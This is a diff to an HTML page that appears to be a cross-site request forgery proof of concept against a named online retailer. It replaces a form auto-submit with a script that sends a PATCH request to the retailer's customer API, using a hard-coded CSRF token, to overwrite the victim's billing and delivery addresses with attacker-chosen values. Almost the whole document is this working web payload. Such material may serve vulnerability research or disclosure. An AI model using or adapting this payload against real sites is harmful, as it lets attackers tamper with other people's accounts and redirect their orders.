@@ -6,7 +6,14 @@
         <input type="hidden" name="Csrf-Token" value="f7b24e74899ced25052be23894053aab">
     </form>
     <script>
-        document.getElementById("evilForm").submit();
+        fetch("https://www.boozt.com/at/de-at/api/customer", {
+            method: "PATCH",
+            headers: {
+                "Content-Type": "application/json",
+                "Csrf-Token": "f7b24e74899ced25052be23894053aab"
+            },
+            body: JSON.stringify({"requisites":{"billing_firstname":"Hacked","billing_lastname":"ByMe","billing_street":"EvilStreet","billing_postcode":"666","billing_city":"Hell","billing_country":"pt","delivery_firstname":"Hacked","delivery_lastname":"ByMe","delivery_street":"EvilStreet","delivery_postcode":"666","delivery_city":"Hell","delivery_country":"pt","delivery_as_billing":true}})
+        }).then(response => response.json()).then(data => console.log(data));
     </script>
 </body>
 </html>
